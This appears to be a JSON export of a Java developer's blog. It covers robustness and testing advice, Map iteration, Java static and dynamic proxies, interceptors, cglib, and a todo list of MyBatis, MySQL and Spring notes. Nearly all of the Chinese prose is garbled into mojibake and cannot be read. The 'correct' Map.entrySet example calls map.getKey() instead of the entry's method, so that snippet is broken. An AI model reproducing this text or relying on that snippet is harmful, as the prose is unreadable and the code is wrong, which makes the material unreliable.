å…¥çš„ç”¨æˆ·ç®€ä»‹é•¿åº¦å¤§äº40å­—èŠ‚ ä¼ å…¥çš„ç”¨æˆ·ç®€ä»‹ä¸ºä¸æ”¯æŒçš„å­—ç¬¦ç¼–ç  ç”¨æˆ·ä¼ å…¥äº†æ­£ç¡®çš„æ•°æ®ä½†æ˜¯è¿”å›çš„ç»“æœä¸æ­£ç¡® åšå›å½’æµ‹è¯•æˆ‘ä»¬åœ¨ä¿®å¤ä¸€ä¸ªissue,æˆ–è€…å¢åŠ æ–°çš„æ¥å£çš„æ—¶å€™ï¼Œå¹¶ä¸èƒ½ç¡®ä¿æˆ‘ä»¬çš„ä¿®æ”¹å¯¹å…¶ä»–æ¥å£æ²¡æœ‰å½±å“ï¼æ‰€ä»¥ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åšå›å½’æµ‹è¯•ï¼å¦‚æœä¸Šé¢å†™äº†TDDçš„æµ‹è¯•è„šæœ¬ï¼Œé‚£è¿™é‡Œæˆ‘ä»¬åªéœ€è¦åœ¨è¿™ä¸ªè„šæœ¬ä¸­æ–°å¢æ–°æ¥å£çš„æµ‹è¯•ç”¨ä¾‹ï¼Œå†æ‰§è¡Œä¸€éæµ‹è¯•å°±Okäº†ï¼å¦‚æœæ²¡æœ‰ä¸Šé¢çš„é‚£ä¸ªè„šæœ¬ï¼Œè¿™é‡Œä½ ä¹Ÿå¾ˆå¯èƒ½å°±ä¼šå› ä¸ºå«Œéº»çƒ¦è€Œä¸åšï¼ æˆ‘ä»¬é¡¹ç›®ç»„ä¸­çš„æˆå‘˜ï¼Œå¾ˆå¤šæ¬¡å°±æ˜¯å› ä¸ºæ²¡æœ‰æ‰§è¡Œå›å½’æµ‹è¯•ï¼Œè€Œå¯¼è‡´æ–°æ¥å£èƒ½ç”¨è€Œæ—§æ¥å£å¤±æ•ˆçš„é—®é¢˜ï¼ å°†ç”Ÿäº§ç¯å¢ƒä¸‹æ•°æ®åº“éœ€è¦çš„çº¦æŸåŒæ ·åŠ åœ¨å¼€å‘ç¯å¢ƒä¸‹æ•°æ®åº“çº¦æŸå…¶å®ä¹Ÿæ˜¯æé«˜æˆ‘ä»¬çš„ä»£ç å¥å£®æ€§çš„ä¸€ä¸ªå¥½å¸®æ‰‹ï¼æ¯”å¦‚ï¼Œåœ¨æ–°å¢ç”¨æˆ·çš„ç²‰ä¸æ¥å£ä¸­(ç”¨æˆ·å’Œç²‰ä¸çš„å…³ç³»åœ¨ä¸€å¼ å•ç‹¬çš„è¡¨ä¸­)ï¼Œæˆ‘ä»¬éœ€è¦ç”¨æˆ·ä¼ å…¥çš„ç²‰ä¸idæ˜¯ä¸€ä¸ªå­˜åœ¨çš„ç”¨æˆ·çš„uuidï¼å¦‚æœä¸ç”¨çº¦æŸï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä»£ç ä¸­å…ˆéå†æ•°æ®åº“æ¥æŸ¥è¯¢ç”¨æˆ·æ˜¯å¦å­˜åœ¨ï¼Œè€Œå¦‚æœæˆ‘ä»¬ç›´æ¥ä½¿ç”¨å¤–é”®çº¦æŸï¼Œè®©ç²‰ä¸idæ˜¯ç”¨æˆ·idçš„å¤–é”®ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æŸ¥çœ‹æ•°æ®åº“æ˜¯å¦è¿”å›è¿åå¤–é”®çº¦æŸçš„é”™è¯¯å°±èƒ½ç¡®å®šç”¨æˆ·æ˜¯å¦å­˜åœ¨äº†ï¼ åœ¨ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯çš„é‚£ä¸ªä¾‹å­ä¸­ï¼Œå¦‚æœä½ æ²¡æœ‰å…ˆå†™æµ‹è¯•è„šæœ¬ï¼Œå¿˜äº†åˆ¤æ–­ç”¨æˆ·æ˜µç§°æ˜¯å¦ä¸ºç©ºï¼Œè€Œä½ æ•°æ®åº“ä¸­ï¼Œç”¨æˆ·æ˜µç§°å­—æ®µæœ‰éç©ºçº¦æŸï¼é€šè¿‡ä¼ å…¥ç©ºæ˜µç§°æ—¶è¿™ä¸ªéç©ºçº¦æŸæŠ¥çš„é”™è¯¯ï¼Œä½ å°±èƒ½çŸ¥é“éœ€è¦å…ˆåˆ¤æ–­ç”¨æˆ·æ˜µç§°æ˜¯å¦ä¸ºç©ºï¼ æ°¸è¿œä¸è¦è®¤ä¸ºä½ ä¾èµ–çš„ä¸œè¥¿ä¼šæ­£å¸¸å·¥ä½œä½œä¸ºä¸€ä¸ªåå°å¾®æœåŠ¡ï¼Œæˆ‘ä»¬ä¸€å®šä¼šç”¨åˆ°æ•°æ®åº“ï¼Œä¼šç”¨åˆ°ç¼“å­˜ï¼å¦‚æœä½ å‡è®¾æ•°æ®åº“ä¸ä¼šå®•æœºï¼Œå¹¶æ²¡æœ‰å¤„ç†æ•°æ®åº“å®•æœºçš„ä»£ç ï¼Œé‚£ä½ çš„ä»£ç æ°¸è¿œéƒ½ä¸å¤Ÿå¥å£®ï¼ä¸€æ—¦æ•°æ®åº“å®•æœºï¼Œå‰å°å°±ä¼šè¿”å›å¤§é‡çš„500ï¼Œæœ‰å¿ƒäººå°±ä¼šæœ‰å¯ä¹˜ä¹‹æœºäº†ï¼ åšå‹åŠ›æµ‹è¯•æœ‰çš„é”™è¯¯ï¼Œå¦‚æœä½ ä¸åšå‹åŠ›æµ‹è¯•ï¼Œæ˜¯å¯Ÿè§‰ä¸åˆ°çš„ï¼æ¯”å¦‚ï¼Œä¸æ­£ç¡®çš„å¹¶å‘å¤„ç†ï¼Œæ­»é”ç­‰é—®é¢˜ï¼å¯¹äºä¸€ä¸ªç‚¹èµæ¥å£æ¥è¯´ï¼Œå¦‚æœä½ ç”¨postmanæ¥è¿›è¡Œæµ‹è¯•ï¼Œç‚¹ä¸€æ¬¡ç»“æœæ­£ç¡®ï¼Œç‚¹ä¸¤æ¬¡ç»“æœæ­£ç¡®ï¼Œä½†æ˜¯ä½ å¹¶å‘çš„ç‚¹ä¸€ä¸‡æ¬¡ï¼Œç»“æœå¯èƒ½å°±ä¼šå› ä¸ºå¹¶å‘å¤„ç†ä¸å¯¹è€Œæ˜¯9990äº†ï¼ å¦‚æœä½ æ²¡ç”¨æ•°æ®åº“è¿æ¥æ± ï¼Œç½‘ç»œå¸¦å®½è¶³å¤Ÿå¤§ï¼Œå¹¶å‘æ‰§è¡Œåä¸‡æ¬¡æ•°æ®åº“å†™æ“ä½œï¼Œæ•°æ®åº“å¯èƒ½å°±ä¼šå› æ­¤å®•æœº(è‡³å°‘ä¼šæœ‰æ˜æ˜¾çš„ç½‘è·¯å»¶æ—¶)ï¼Œè¿™æ—¶å€™å¦‚æœä½ çš„å¾®æœåŠ¡å¦‚æœå¯¹å¤–æä¾›æ­£ç¡®çš„é”™è¯¯ä¿¡æ¯ï¼Œé‚£æ­å–œï¼Œä½ çš„ä»£ç è¶³å¤Ÿå¥å£®äº†ï¼","categories":[],"tags":[]},{"title":"Improve Robustness (1)","slug":"improve-robustness-(1)","date":"2021-05-12T07:44:09.000Z","updated":"2021-05-12T15:51:22.995Z","comments":true,"path":"improve-robustness-(1)/","link":"","permalink":"https://blog.kayleh.top/improve-robustness-(1)/","excerpt":"","text":"æé«˜ä»£ç é²æ£’æ€§â€”â€”ï¼ˆ1ï¼‰ éœ€è¦ Map çš„ä¸»é”®å’Œå–å€¼æ—¶ï¼Œåº”è¯¥è¿­ä»£ entrySet() å½“å¾ªç¯ä¸­åªéœ€è¦ Map çš„ä¸»é”®æ—¶ï¼Œè¿­ä»£ keySet() æ˜¯æ­£ç¡®çš„ã€‚ä½†æ˜¯ï¼Œå½“éœ€è¦ä¸»é”®å’Œå–å€¼æ—¶ï¼Œè¿­ä»£ entrySet() æ‰æ˜¯æ›´é«˜æ•ˆçš„åšæ³•ï¼Œæ¯”å…ˆè¿­ä»£ keySet() åå†å» get å–å€¼æ€§èƒ½æ›´ä½³ã€‚ åä¾‹ï¼š Map&lt;String,String&gt; map = new HashMap(); for(String key : map.keySet()) { String value = map.get(key); } æ­£ä¾‹ï¼š Map&lt;String,String&gt; map = new HashMap(); for(Map.Entry&lt;String,String&gt; entry:map.entrySet()) { String key = map.getKey(); String value = entry.getValue(); ... } ä¸è¦è®©å¸¸é‡å˜æˆå˜é‡","categories":[],"tags":[]},{"title":"Proxy","slug":"proxy","date":"2021-04-25T05:37:43.000Z","updated":"2021-04-25T13:44:45.051Z","comments":true,"path":"proxy/","link":"","permalink":"https://blog.kayleh.top/proxy/","excerpt":"","text":"ä»£ç†æ¨¡å¼æ˜¯ä¸€ç§ç»å…¸çš„è®¾è®¡æ¨¡å¼ï¼Œä»£ç†çš„æ„ä¹‰åœ¨äºç”Ÿæˆä»£ç†å¯¹è±¡ï¼Œåœ¨æœåŠ¡æä¾›æ–¹å’Œä½¿ç”¨æ–¹ä¹‹é—´å……å½“ä¸€ä¸ªåª’ä»‹ï¼Œæ§åˆ¶çœŸå®å¯¹è±¡çš„è®¿é—®ã€‚ ä»£ç†åˆ†ä¸ºé™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†ä¸¤ç§ã€‚ é™æ€ä»£ç†éœ€è¦é€šè¿‡æ‰‹åŠ¨æˆ–å·¥å…·ç”Ÿæˆä»£ç†ç±»å¹¶ç¼–è¯‘ï¼Œä»£ç†ç±»å’Œå§”æ‰˜ç±»çš„å…³ç³»åœ¨ç¼–è¯‘æœŸå°±å·²ç»ç¡®å®šã€‚åŠ¨æ€ä»£ç†å…è®¸å¼€å‘äººå‘˜åœ¨è¿è¡Œæ—¶åŠ¨æ€çš„åˆ›å»ºå‡ºä»£ç†ç±»åŠå…¶å¯¹è±¡ã€‚ Spring AOP çš„ä¸»è¦æŠ€æœ¯åŸºç¡€å°±æ˜¯ Java çš„åŠ¨æ€ä»£ç†æœºåˆ¶ã€‚ é™æ€ä»£ç†é™æ€ä»£ç†çš„å®ç°éœ€è¦ä¸€ä¸ªæ¥å£(è¡¨ç¤ºè¦å®Œæˆçš„åŠŸèƒ½)ï¼Œä¸€ä¸ªçœŸå®å¯¹è±¡å’Œä¸€ä¸ªä»£ç†å¯¹è±¡(ä¸¤è€…éƒ½éœ€å®ç°è¿™ä¸ªæ¥å£)ã€‚ ç¤ºä¾‹å¦‚ä¸‹ï¼š interface Shopping { void buy(); } class Client implements Shopping { public void buy() { System.out.println(&quot;æˆ‘æƒ³ä¹°è¿™ä»¶å•†å“&quot;); } } class StaticProxy implements Shopping { private Shopping shopping; public StaticProxy(Shopping shopping) { this.shopping = shopping; } public void buy() { System.out.println(&quot;é™ä»·ä¿ƒé”€ï¼Œç–¯ç‹‚å¤§ç”©å–äº†ï¼&quot;); shopping.buy(); } } public class StaticProxyTest { public static void main(String[] args) { Client client = new Client(); StaticProxy service = new StaticProxy(client); service.buy(); } } ----------------------------------------- è¾“å‡ºç»“æœï¼š é™ä»·ä¿ƒé”€ï¼Œç–¯ç‹‚å¤§ç”©å–äº†ï¼ æˆ‘æƒ³ä¹°è¿™ä»¶å•†å“ åŠ¨æ€ä»£ç†åŠ¨æ€ä»£ç†å¯ä»¥è®©æˆ‘ä»¬åœ¨è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆä»£ç†ç±»ï¼Œè§£è€¦ç¨‹åº¦æ›´é«˜ã€‚Java åŠ¨æ€ä»£ç†çš„å®ç°ä¸»è¦å€ŸåŠ©äº java.lang.reflect åŒ…ä¸­çš„ Proxy ç±»ä¸ InvocationHandler æ¥å£ï¼Œæ‰€æœ‰å¯¹åŠ¨æ€ä»£ç†å¯¹è±¡çš„æ–¹æ³•è°ƒç”¨éƒ½ä¼šè½¬å‘åˆ° InvocationHandler ä¸­çš„ invoke() æ–¹æ³•ä¸­å®ç°ã€‚ä¸€èˆ¬æˆ‘ä»¬ç§°å®ç°äº† InvocationHandler æ¥å£çš„ç±»ä¸ºè°ƒç”¨å¤„ç†å™¨ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ Proxy çš„é™æ€å·¥å‚æ–¹æ³• newProxyInstance åˆ›å»ºåŠ¨æ€ä»£ç†ç±»å®ä¾‹ã€‚ æ–¹æ³•å¦‚ä¸‹ï¼š public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) loaderï¼šç±»åŠ è½½å™¨interfacesï¼šç±»å®ç°çš„å…¨éƒ¨æ¥å£hï¼šè°ƒç”¨å¤„ç†å™¨ ç¤ºä¾‹å¦‚ä¸‹ï¼š public class DynamicProxy implements InvocationHandler { private Object target = null; DynamicProxy(Object target) { this.target = target; } /** * ä»£ç†æ–¹æ³•é€»è¾‘ * * @param proxy ä»£ç†å¯¹è±¡ * @param method è°ƒåº¦æ–¹æ³• * @param args è°ƒåº¦æ–¹æ³•å‚æ•° */ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(&quot;ä»£ç†å‰&quot;); method.invoke(target, args); System.out.println(&quot;ä»£ç†å&quot;); return null; } } public class DyProxyTest { public static void main(String[] args) { Shopping client = new Client(); DynamicProxy dyProxy = new DynamicProxy(client); Shopping shop = (Shopping) Proxy.newProxyInstance(Shopping.class.getClassLoader(), new Class[]{Shopping.class}, dyProxy); shop.buy(); } } è¾“å‡ºç»“æœï¼š ä»£ç†å‰ æˆ‘æƒ³ä¹°è¿™ä»¶å•†å“ ä»£ç†å å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥å°† Proxy.newProxyInstance æ–¹æ³•æ”¾åˆ°è°ƒç”¨å¤„ç†å™¨ä¸­ï¼Œä½¿å®¢æˆ·ç«¯ç¼–ç¨‹æ›´ä¸ºç®€å•ã€‚ ç¤ºä¾‹å¦‚ä¸‹ï¼š public class DynamicProxy implements InvocationHandler { private Object target = null; DynamicProxy() { } DynamicProxy(Object target) { this.target = target; } public Object bind(Object target) { this.target = target; return Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(), this); } /** * ä»£ç†æ–¹æ³•é€»è¾‘ * * @param proxy ä»£ç†å¯¹è±¡ * @param method è°ƒåº¦æ–¹æ³• * @param args è°ƒåº¦æ–¹æ³•å‚æ•° */ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(&quot;ä»£ç†å‰&quot;); method.invoke(target, args); System.out.println(&quot;ä»£ç†å&quot;); return null; } } public class DyProxyTest { public static void main(String[] args) { Shopping client = new Client(); DynamicProxy dyProxy = new DynamicProxy(); Shopping shop = (Shopping) dyProxy.bind(client); shop.buy(); } } æ‹¦æˆªå™¨æ‹¦æˆªå™¨ä¸»è¦å°±æ˜¯é åŠ¨æ€ä»£ç†å®ç°ï¼Œå®ƒå¯ä»¥ç®€åŒ–åŠ¨æ€ä»£ç†çš„ä½¿ç”¨ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“æ‹¦æˆªå™¨æ¥å£çš„ä½¿ç”¨æ–¹æ³•å³å¯ï¼Œæ— é¡»çŸ¥é“åŠ¨æ€ä»£ç†çš„å®ç°ç»†èŠ‚ã€‚ ç¤ºä¾‹å¦‚ä¸‹ï¼š public interface Interceptor { public boolean before(Object proxy, Object target, Method method, Object[] args); public void around(Object proxy, Object target, Method method, Object[] args); public void after(Object proxy, Object target, Method method, Object[] args); } public class MyInterceptor implements Interceptor { @Override public boolean before(Object proxy, Object target, Method method, Object[] args) { System.out.println(&quot;before&quot;); return false; } @Override public void around(Object proxy, Object target, Method method, Object[] args) { System.out.println(&quot;around&quot;); } @Override public void after(Object proxy, Object target, Method method, Object[] args) { System.out.println(&quot;after&quot;); } } public class InterceptorProxy implements InvocationHandler { private Object target = null; Interceptor interceptor = null; InterceptorProxy(Interceptor interceptor) { this.interceptor = interceptor; } public Object bind(Object target) { this.target = target; return Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(), this); } /** * ä»£ç†æ–¹æ³•é€»è¾‘ * * @param proxy ä»£ç†å¯¹è±¡ * @param method è°ƒåº¦æ–¹æ³• * @param args è°ƒåº¦æ–¹æ³•å‚æ•° */ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { if (interceptor == null) { method.invoke(target, args); } Object result = null; if (interceptor.before(proxy, target, method, args)) { result = method.invoke(target, args); } else { interceptor.around(proxy, target, method, args); } interceptor.after(proxy, target, method, args); return result; } } è¾“å‡ºç»“æœï¼š beforearoundafter å¼€å‘è€…åªéœ€è¦çŸ¥é“æ‹¦æˆªå™¨çš„ä½œç”¨ï¼Œè®¾ç½®æ‹¦æˆªå™¨ï¼Œå› è€Œç›¸å¯¹ç®€å•ä¸€äº›ã€‚ æ‹¦æˆªå™¨åœ¨ Spring AOP ä¸ Spring MVC ä¸­éƒ½æœ‰åº”ç”¨ã€‚åœ¨ Spring AOP ä¸­ï¼Œ é’ˆå¯¹æ¥å£åšä»£ç†é»˜è®¤ä½¿ç”¨çš„æ˜¯ JDK è‡ªå¸¦çš„ Proxy+InvocationHandler é’ˆå¯¹ç±»åšä»£ç†ä½¿ç”¨çš„æ˜¯ Cglib åœ¨ Spring MVCä¸­ï¼Œ ä¸»è¦é€šè¿‡ HandlerInterceptor æ¥å£å®ç°æ‹¦æˆªå™¨çš„åŠŸèƒ½ã€‚ HandlerInterceptor æ¥å£ä¸­åŒ…å«3ä¸ªæ–¹æ³•ï¼š preHandleï¼šæ‰§è¡Œ controller å¤„ç†ä¹‹å‰æ‰§è¡Œï¼Œè¿”å›å€¼ä¸ºtrueæ—¶æ¥ç€æ‰§è¡Œ postHandle å’Œ afterCompletionï¼Œè¿”å›falseåˆ™ä¸­æ–­æ‰§è¡Œ postHandleï¼šåœ¨æ‰§è¡Œ controller åï¼ŒModelAndView å¤„ç†å‰æ‰§è¡Œ afterCompletion ï¼šåœ¨æ‰§è¡Œå®Œ ModelAndView ä¹‹åæ‰§è¡Œæ­¤å¤–ï¼ŒSpring MVC æä¾›äº†æŠ½è±¡ç±» HandlerInterceptorAdapterï¼Œå®ç°äº† HandlerInterceptor æ¥å£ã€‚ cglibå› ä¸º Java è‡ªå¸¦çš„åŠ¨æ€ä»£ç†å·¥å…·å¿…é¡»è¦æœ‰ä¸€ä¸ªæ¥å£ï¼Œcglib ä¸éœ€è¦æ¥å£ï¼Œåªéœ€è¦ä¸€ä¸ªéæŠ½è±¡ç±»å°±èƒ½å®ç°åŠ¨æ€ä»£ç†ã€‚ ç¤ºä¾‹å¦‚ä¸‹ï¼š class ClientProxy implements MethodInterceptor { @Override public Object intercept(Object proxy, Method method, Object[] args, MethodProxy methodProxy) throws Throwable { System.out.println(&quot;before&quot;); Object obj = methodProxy.invokeSuper(proxy, args); System.out.println(&quot;after&quot;); return obj; } } public class CglibTest { public static void main(String[] args) { ClientProxy clientProxy = new ClientProxy(); Enhancer enhancer = new Enhancer(); enhancer.setSuperclass(Client.class); enhancer.setCallback(clientProxy); Client client = (Client) enhancer.create(); client.buy(); } } è¾“å‡ºç»“æœï¼š beforeæˆ‘æƒ³ä¹°è¿™ä»¶å•†å“after â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œæƒ…è°Šé£æœˆã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/weixin_43320847/article/details/82938754","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://blog.kayleh.top/tags/java/"}]},{"title":"todoList","slug":"note","date":"2021-04-23T07:53:25.000Z","updated":"2021-06-06T06:20:27.225Z","comments":true,"path":"note/","link":"","permalink":"https://blog.kayleh.top/note/","excerpt":"","text":"ç¬”è®°TodoList https://www.cnblogs.com/lenve/p/11242055.html .imlæ–‡ä»¶ï¼Œtargetæ–‡ä»¶ä¸èƒ½æäº¤ï¼Œåªæäº¤ä¸€äº›ä»£ç ã€‚ æ•°æ®åº“ unionå’Œjoinï¼šunionæ˜¯ç”¨æ¥è”åˆä¸åŒselectç»“æœçš„ï¼Œä¼šåˆ é™¤é‡å¤çš„æ•°æ®ã€‚ insertAndGetId &lt;!-- æ’å…¥ä¸€ä¸ªå•†å“ --&gt; &lt;insert id=&quot;insertProduct&quot; parameterType=&quot;domain.model.ProductBean&quot; &gt; &lt;selectKey resultType=&quot;java.lang.Long&quot; order=&quot;AFTER&quot; keyProperty=&quot;productId&quot;&gt; SELECT LAST_INSERT_ID() &lt;/selectKey&gt; INSERT INTO t_product(productName,productDesrcible,merchantId)values(#{productName},#{productDesrcible},#{merchantId}); &lt;/insert&gt; æ•°æ®åº“æŸ¥è¯¢ä¸èƒ½æ•´è¡¨æŸ¥è¯¢ï¼Œåº”åˆ›å»ºå®ä½“ç±»æ¥æ”¶è¿”å›ç»™å‰ç«¯ bitç±»å‹æ•°æ®æ˜¯ intç±»å‹(1&amp;0) SQLExceptionï¼šTimeZone è§£å†³æ–¹å¼:åœ¨è¿æ¥æ•°æ®åº“çš„urlååŠ ä¸ŠserverTimezone=UTCï¼Œå®Œæ•´çš„urlä¸º: url=jdbc:mysql://localhost:3306/spring_cache?useUnicode=true&amp;characterEncoding=UTF8&amp;serverTimezone=UTC mysqldump è®¾ç½®å­—ç¬¦é›† mysqldump -u root -p --default-character-set=utf8mb4 dev &gt; D:/dev.sql -------- alter table `table_name` convert to character set utf8mb4; mybatis-plusï¼šSQLè„šæœ¬å›ºå®šå­—æ®µ CREATE TABLE `table` ( `_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;??å®šä¹‰è¡¨&#39;, `id` varchar(50) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;ä¸»é”®Id&#39;, `deleted` bit(1) NOT NULL DEFAULT b&#39;0&#39; COMMENT &#39;æ˜¯å¦åˆ é™¤&#39;, `version` int(11) NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;ä¹è§‚é”&#39;, `create_userid` varchar(255) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;åˆ›å»ºç”¨æˆ·Id&#39;, `create_username` varchar(255) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;åˆ›å»ºç”¨æˆ·åç§°&#39;, `create_time` timestamp(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3) COMMENT &#39;åˆ›å»ºæ—¶é—´&#39;, `update_userid` varchar(255) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;æ›´æ–°ç”¨æˆ·Id&#39;, `update_username` varchar(255) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;æ›´æ–°ç”¨æˆ·åç§°&#39;, `update_time` timestamp(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3) ON UPDATE CURRENT_TIMESTAMP(3) COMMENT &#39;æ›´æ–°æ—¶é—´&#39;, PRIMARY KEY (`_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT=&#39;??å®šä¹‰è¡¨&#39;; å°ç¨‹åºã€å‰ç«¯ module.exports = {} //æš´éœ²ï¼Ÿå…¨å±€å˜é‡ï¼Ÿ query -queryæ˜¯ä¼ å‚æ•°ç”¨çš„ã€‚ -ä¸Šä¸ªé¡µé¢æˆ–è€…é‚£ä¸ªé¡µé¢è·³è½¬ä¼ è¿‡æ¥çš„ -å°ç¨‹åºæ‰“å¼€çš„åœ°å€é“¾æ¥æ˜¯å¯ä»¥å¸¦è¯·æ±‚å‚æ•°çš„ï¼Œè·Ÿurlçš„å¾ˆç±»ä¼¼ï¼Œä¾‹å¦‚ï¼šsdfasdf?abc=123&amp;bcd=234&amp;cde=345ã€‚ è¿™ä¸ªæ„æ€æ˜¯åœ¨å°ç¨‹åºå¯åŠ¨æ—¶è·å–mpidå¹¶å‘å…¨å±€å˜é‡é‡Œè¿›è¡Œèµ‹å€¼ ç½‘ç»œ ResponseEntity 1.ResponseEntityçš„ä¼˜å…ˆçº§é«˜äº@ResponseBodyã€‚åœ¨ä¸æ˜¯ResponseEntityçš„æƒ…å†µä¸‹æ‰å»æ£€æŸ¥æœ‰æ²¡æœ‰@ResponseBodyæ³¨è§£ã€‚å¦‚æœå“åº”ç±»å‹æ˜¯ResponseEntityå¯ä»¥ä¸å†™@ResponseBodyæ³¨è§£ï¼Œå†™äº†ä¹Ÿæ²¡æœ‰å…³ç³»ã€‚2.ResponseEntity æ˜¯åœ¨ org.springframework.http.HttpEntity çš„åŸºç¡€ä¸Šæ·»åŠ äº†http status code(httpçŠ¶æ€ç )ï¼Œç”¨äºRestTemplateä»¥åŠ@Controllerçš„HandlerMethodã€‚å®ƒåœ¨Controolerä¸­æˆ–è€…ç”¨äºæœåŠ¡ç«¯å“åº”æ—¶ï¼Œä½œç”¨æ˜¯å’Œ@ResponseStatusä¸@ResponseBodyç»“åˆèµ·æ¥çš„åŠŸèƒ½ä¸€æ ·çš„ã€‚ç”¨äºRestTemplateæ—¶ï¼Œå®ƒæ˜¯æ¥æ”¶æœåŠ¡ç«¯è¿”å›çš„http status code å’Œ reasonçš„ã€‚3.æ€»ç»“ï¼š ç®€å•ç²—æš´çš„è®² @ResponseBodyå¯ä»¥ç›´æ¥è¿”å›Jsonç»“æœï¼Œ @ResponseEntityä¸ä»…å¯ä»¥è¿”å›jsonç»“æœï¼Œè¿˜å¯ä»¥å®šä¹‰è¿”å›çš„HttpHeaderså’ŒHttpStatus æ¡†æ¶ //å‡è®¾è¿™æ˜¯ä¸€ä¸ªserviceç±»çš„ç‰‡æ®µ try{ //å‡ºç°å¼‚å¸¸ } catch (Exception e) { e.printStackTrace(); //è®¾ç½®æ‰‹åŠ¨å›æ»š TransactionAspectSupport.currentTransactionStatus() .setRollbackOnly(); } //æ­¤æ—¶returnè¯­å¥èƒ½å¤Ÿæ‰§è¡Œ return xxx; å¦‚ä¸Šï¼š å½“æˆ‘ä»¬éœ€è¦åœ¨äº‹åŠ¡æ§åˆ¶çš„serviceå±‚ç±»ä¸­ä½¿ç”¨try catch å»æ•è·å¼‚å¸¸åï¼Œå°±ä¼šä½¿äº‹åŠ¡æ§åˆ¶å¤±æ•ˆï¼Œå› ä¸ºè¯¥ç±»çš„å¼‚å¸¸å¹¶æ²¡æœ‰æŠ›å‡ºï¼Œå°±ä¸æ˜¯è§¦å‘äº‹åŠ¡ç®¡ç†æœºåˆ¶ã€‚æ€æ ·æ‰èƒ½å³ä½¿ç”¨try catchå»æ•è·å¼‚å¸¸ï¼Œè€Œåˆè®©å‡ºç°å¼‚å¸¸åspringå›æ»šå‘¢ï¼Œè¿™é‡Œå°±è¦ç”¨åˆ° TransactionAspectSupport.currentTransactionStatus().setRollbackOnly(); redisTemplate @Accessors(chain = true) @EqualsAndHashCode(callSuper = true)//lombokçš„ä¸€ä¸ªæ–¹æ³• @EnableScheduling spring securityï¼ˆJWTã€OAUTH2ã€ï¼‰é‰´æƒ https://kayleh.top/head-first-security mybatis-plus https://mp.baomidou.com/guide/ Field baseMapper in com.xxx required a single bean,but 100 were found â€”â€”â€”â€”Mybatis-Plus æŠ¥é”™å‘ç”Ÿæ—¶é—´ï¼šé¡¹ç›®å¯åŠ¨æ—¶ã€‚ æŠ¥é”™è‹±æ–‡æè¿°ï¼šField baseMapper in com.xxx required a single bean,but 100 were found æŠ¥é”™ä¿¡æ¯ä¸­æ–‡æè¿°ï¼šæ–‡ä»¶baseMapperåªéœ€è¦ä¸€ä¸ªbeanæœåŠ¡ï¼Œä½†æ˜¯åˆ°äº†å¤šä¸ªï¼Œæ‰€ä»¥å®ƒä¸çŸ¥é“é€‰å“ªä¸ªè§£å†³ï¼š æƒ…å†µä¸€ï¼šä½ çš„è¿™ä¸ªç±»å…¶å®ä¸éœ€è¦æ“ä½œåˆ°æ•°æ®åº“ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™ç›´æ¥æŠŠç»§æ‰¿IServiceç»™å»æ‰å°±å¥½ã€‚ æƒ…å†µäºŒï¼šä½ çš„è¿™ä¸ªç±»éœ€è¦æ“ä½œåˆ°æ•°æ®åº“ï¼Œé‚£ä¹ˆå°±æŠŠç›¸åº”çš„æ³›å‹ç»™åŠ ä¸Šï¼Œè¿™æ ·å®ƒå°±çŸ¥é“ä½ åˆ°åº•è¦æ‰¾çš„æ˜¯å“ªä¸ªmapperã€‚ åŸºç¡€ ç”Ÿæˆéšæœºå­—ç¬¦ä¸²å…¥åº“æ—¶ï¼Œæœ€å¥½ä¸è¦ç”¨UUID.å› ä¸ºUUIDç”Ÿæˆçš„å­—ç¬¦ä¸²ä¸­æœ‰å­—æ¯ï¼Œåœ¨ä¸šåŠ¡ä¸­ï¼Œä½¿ç”¨åˆ°å¸¦å­—æ¯å’Œæ•°å­—ç»„åˆçš„å­—ç¬¦ä¸²ä¸å¸¸ç”¨ï¼Œæœ€å¥½ä½¿ç”¨ math.random()èŒƒå›´æ˜¯[0.0, 1.0)ï¼Œé‚£ä¹ˆmath.random()*9+1ä¸€å®šæ˜¯å°äº10çš„ï¼Œ(Math.random()*9+1)*100000ä¸€å®šæ˜¯&lt;10*100000=1000000çš„ä¸€ä¸ªæ•° åˆ¤ç©º(null == ?) åºåˆ—åŒ–ç‰ˆæœ¬å·ï¼Ÿ æ‹¼æ¥å­—ç¬¦ä¸² String.join(&quot;,&quot;, List); getConstructorå’ŒgetDeclaredConstructor Classç±»çš„getConstructor()æ–¹æ³•,æ— è®ºæ˜¯å¦è®¾ç½®setAccessible(),éƒ½ä¸å¯è·å–åˆ°ç±»çš„ç§æœ‰æ„é€ 